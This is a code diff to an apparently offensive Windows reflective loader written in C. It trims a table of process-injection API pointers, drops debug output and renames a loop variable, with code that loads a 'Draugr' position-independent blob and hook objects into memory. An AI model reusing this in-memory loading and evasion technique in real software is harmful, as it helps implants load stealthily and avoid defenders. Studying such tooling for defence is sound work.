@@ -42,29 +42,6 @@ typedef struct {
     WIN32_FUNC(LoadLibraryA);
     WIN32_FUNC(GetProcAddress);
     DRAUGR Draugr;
-    WIN32_FUNC(VirtualAlloc);
-    WIN32_FUNC(VirtualAllocEx);
-    WIN32_FUNC(VirtualProtect);
-    WIN32_FUNC(VirtualProtectEx);
-    WIN32_FUNC(VirtualFree);
-    WIN32_FUNC(VirtualQuery);
-    WIN32_FUNC(GetThreadContext);
-    WIN32_FUNC(SetThreadContext);
-    WIN32_FUNC(ResumeThread);
-    WIN32_FUNC(CreateThread);
-    WIN32_FUNC(CreateRemoteThread);
-    WIN32_FUNC(OpenProcess);
-    WIN32_FUNC(OpenThread);
-    WIN32_FUNC(ExitThread);
-    WIN32_FUNC(CloseHandle);
-    WIN32_FUNC(Sleep);
-    WIN32_FUNC(CreateFileMappingA);
-    WIN32_FUNC(MapViewOfFile);
-    WIN32_FUNC(UnmapViewOfFile);
-    WIN32_FUNC(DuplicateHandle);
-    WIN32_FUNC(ReadProcessMemory);
-    WIN32_FUNC(WriteProcessMemory);
-    WIN32_FUNC(CreateProcessA);
 } WIN32FUNCS;
 
 char __DRAUGR__[0] __attribute__((section("draugr")));
@@ -135,7 +112,7 @@ void fixSectionPermissions(DLLDATA * dll, char * src, char * dst, MEMORY_REGION 
 
     sectionHdr  = (IMAGE_SECTION_HEADER *)PTR_OFFSET(dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader);
 
-    for (int x = 0; x < numberOfSections; x++)
+    for (int i = 0; i < numberOfSections; i++)
     {
         sectionDst  = dst + sectionHdr->VirtualAddress;
         sectionSize = sectionHdr->SizeOfRawData;
@@ -166,10 +143,10 @@ void fixSectionPermissions(DLLDATA * dll, char * src, char * dst, MEMORY_REGION 
         protectVirtualMemory(sectionDst, sectionSize, newProtect);
 
         /* track memory */
-        region->sections[x].baseAddress     = sectionDst;
-        region->sections[x].size            = sectionSize;
-        region->sections[x].currentProtect  = newProtect;
-        region->sections[x].previousProtect = newProtect;
+        region->sections[i].baseAddress     = sectionDst;
+        region->sections[i].size            = sectionSize;
+        region->sections[i].currentProtect  = newProtect;
+        region->sections[i].previousProtect = newProtect;
 
         /* advance to our next section */
         sectionHdr++;
@@ -191,12 +168,6 @@ void reflectiveLoader(WIN32FUNCS * funcs, MEMORY_LAYOUT * layout)
 
     /* Allocate memory for it */
     hookDst = (PICO *)allocateVirtualMemory(sizeof(PICO), PAGE_READWRITE);
-
-    #if DEBUG
-    dprintf("hookDst      : 0x%p\n", hookDst);
-    dprintf("PicoDataSize : %d\n", PicoDataSize(hookSrc));
-    dprintf("PicoCodeSize : %d\n", PicoCodeSize(hookSrc));
-    #endif
 
     /* Load it into memory */
     PicoLoad((IMPORTFUNCS *)funcs, hookSrc, hookDst->code, hookDst->data);
@@ -272,41 +243,14 @@ void go()
     char          * picDst;
     MEMORY_LAYOUT   layout;
 
-    funcs.LoadLibraryA       = LoadLibraryA;
-    funcs.GetProcAddress     = GetProcAddress;
-    funcs.VirtualAlloc       = KERNEL32$VirtualAlloc;
-    funcs.VirtualAllocEx     = KERNEL32$VirtualAllocEx;
-    funcs.VirtualProtect     = KERNEL32$VirtualProtect;
-    funcs.VirtualProtectEx   = KERNEL32$VirtualProtectEx;
-    funcs.VirtualFree        = KERNEL32$VirtualFree;
-    funcs.VirtualQuery       = KERNEL32$VirtualQuery;
-    funcs.GetThreadContext   = KERNEL32$GetThreadContext;
-    funcs.SetThreadContext   = KERNEL32$SetThreadContext;
-    funcs.ResumeThread       = KERNEL32$ResumeThread;
-    funcs.CreateThread       = KERNEL32$CreateThread;
-    funcs.CreateRemoteThread = KERNEL32$CreateRemoteThread;
-    funcs.OpenProcess        = KERNEL32$OpenProcess;
-    funcs.OpenThread         = KERNEL32$OpenThread;
-    funcs.ExitThread         = KERNEL32$ExitThread;
-    funcs.CloseHandle        = KERNEL32$CloseHandle;
-    funcs.Sleep              = KERNEL32$Sleep;
-    funcs.CreateFileMappingA = KERNEL32$CreateFileMappingA;
-    funcs.MapViewOfFile      = KERNEL32$MapViewOfFile;
-    funcs.UnmapViewOfFile    = KERNEL32$UnmapViewOfFile;
-    funcs.DuplicateHandle    = KERNEL32$DuplicateHandle;
-    funcs.ReadProcessMemory  = KERNEL32$ReadProcessMemory;
-    funcs.WriteProcessMemory = KERNEL32$WriteProcessMemory;
-    funcs.CreateProcessA     = KERNEL32$CreateProcessA;
+    funcs.LoadLibraryA   = LoadLibraryA;
+    funcs.GetProcAddress = GetProcAddress;
 
     /* Grab the Draugr PIC */
     picSrc = (RESOURCE *)GETRESOURCE(__DRAUGR__);
 
     /* Allocate memory for it */
     picDst = allocateVirtualMemory(picSrc->length, PAGE_READWRITE);
-
-    #if DEBUG
-    dprintf("picDst : 0x%p\n", picDst);
-    #endif
 
     /* Copy it into memory */
     memcpy(picDst, picSrc->value, picSrc->length);
